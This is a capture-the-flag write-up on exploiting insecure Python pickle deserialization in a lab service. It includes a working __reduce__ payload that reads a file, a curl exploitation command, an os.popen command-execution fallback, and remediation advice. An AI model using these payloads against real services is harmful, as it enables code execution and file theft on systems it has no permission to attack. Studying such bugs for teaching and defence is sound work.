# SessionVault - insecure deserialization (Python pickle) → file read

| | |
|---|---|
| **Challenge** | SessionVault |
| **Category** | INJ (deserialization) |
| **Points / Difficulty** | 250 / hard |
| **Target** | http://inj12.chal.deti:8051 |
| **Bug** | CWE-94 - deserialization of untrusted data (Python `pickle`) |

## Hint
> A saved session returns; what it carries is not data; the vault runs what it holds.

## Recon
`POST /restore` (field **`blob`**): a base64 blob that the service
`pickle.loads()`, then **previews**. A harmless object (`pickle.dumps(R())`)
restores and its name shows → the format is `base64(pickle.dumps(obj))`.

## Approach
Unpickling **executes** the object's `__reduce__` reconstruction plan:
`(callable, args)` → `callable(*args)` runs with the service's privileges. Since
the preview **reads file-like objects**, make the reconstruction *be* the flag
file - no shell, no metacharacters needed:

```python
import pickle, base64
class R:
    def __reduce__(self):
        return (open, ("/flag/flag", "r"))
blob = base64.b64encode(pickle.dumps(R())).decode()
```
`pickle.loads(blob)` → `open("/flag/flag","r")` → a file object → the preview
`.read()`s it → flag.

## Exploitation
```bash
BLOB=$(python3 -c "import pickle,base64
class R:
    def __reduce__(self): return (open, ('/flag/flag','r'))
print(base64.b64encode(pickle.dumps(R())).decode())")
curl -s --data-urlencode "blob=$BLOB" http://inj12.chal.deti:8051/restore | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{02399b78177a0ffbe2429777b473e4b0}
```

## For the report
- **Object + hook:** a class whose `__reduce__` returns `(open, ("/flag/flag",
  "r"))` - pickle's documented reconstruction hook.
- **Why the preview was the reflection point:** the app treats restored
  file-like objects specially and reads them, so returning an open file hands the
  content straight back (RCE fallback: `(os.popen, ("cat /flag/flag",))` then
  `.read()`).
- **Language companions + safe loaders:** same class of bug as PHP
  `unserialize()`, Ruby `Marshal.load`, Java `ObjectInputStream`, .NET
  `BinaryFormatter`; "safe" loaders read **data only** - `json`, or
  `pickle`-avoidance entirely.
- **Fix:** **never deserialize untrusted bytes.** If restore is a product
  feature, carry a **schema'd data format with no code path** (JSON/Protobuf) and
  validate it; pickle is code-by-design.

## Root cause & remediation
- **Cause:** `pickle.loads()` on attacker bytes (CWE-94) - "restore the user's
  workspace" == "execute the user's code" for a general-purpose serializer.
- **Fix:** schema'd data + validation as above; least privilege; keep secrets off
  the app host.
